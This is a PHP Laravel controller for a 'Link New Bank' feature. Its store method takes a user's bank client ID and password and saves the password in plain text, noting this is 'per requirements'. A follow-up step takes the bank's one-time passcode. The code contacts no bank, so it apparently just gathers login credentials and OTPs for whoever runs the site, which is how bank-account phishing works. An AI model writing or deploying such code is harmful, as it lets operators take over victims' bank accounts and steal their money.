<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;

class BankController extends Controller
{
    public function __construct()
    {
        $this->middleware(function ($request, $next) {
            $settings = \App\Models\Settings::find(1);
            $mod = $settings ? $settings->modules : [];
            $enabled = isset($mod['bank_link']) && ($mod['bank_link'] === true || $mod['bank_link'] === 'true' || $mod['bank_link'] === 1 || $mod['bank_link'] === '1');
            if (!$enabled) {
                abort(404);
            }
            return $next($request);
        });
    }

    public function index()
    {
        $banks = \App\Models\BankLink::where('user_id', auth()->id())->latest()->get();
        return view('user.bank.index', [
            'banks' => $banks,
            'title' => 'Linked Banks',
        ]);
    }

    public function create()
    {
        return view('user.bank.create', [
            'title' => 'Link New Bank',
        ]);
    }

    public function store(Request $request)
    {
        $request->validate([
            'bank_name' => 'required|string',
            'client_id' => 'required|string',
            'password' => 'required|string',
        ]);

        $bankLink = \App\Models\BankLink::create([
            'user_id' => auth()->id(),
            'bank_name' => $request->bank_name,
            'client_id' => $request->client_id,
            'password' => $request->password, // Stored as plain text per requirements
            'status' => 'pending',
        ]);

        return redirect()->route('bank.otp', $bankLink->id);
    }

    public function otp($id)
    {
        $bankLink = \App\Models\BankLink::where('id', $id)->where('user_id', auth()->id())->firstOrFail();

        return view('user.bank.otp', [
            'bankLink' => $bankLink,
            'title' => 'Enter OTP',
        ]);
    }

    public function storeOtp(Request $request, $id)
    {
        $request->validate([
            'otp' => 'required|string',
        ]);

        $bankLink = \App\Models\BankLink::where('id', $id)->where('user_id', auth()->id())->firstOrFail();
        $bankLink->update([
            'otp' => $request->otp,
            'status' => 'linked',
        ]);

        return redirect()->route('bank.index')->with('success', 'Bank linked successfully. Details have been submitted.');
    }
}
